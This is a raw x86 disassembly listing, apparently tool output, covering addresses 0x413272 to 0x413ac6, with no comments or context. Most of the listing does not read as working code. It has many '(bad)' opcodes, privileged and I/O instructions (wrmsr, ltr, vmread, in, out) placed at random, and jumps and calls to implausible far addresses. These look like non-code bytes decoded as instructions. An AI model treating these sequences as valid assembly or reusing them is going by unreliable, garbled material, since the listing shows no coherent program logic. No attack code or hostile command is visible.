  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
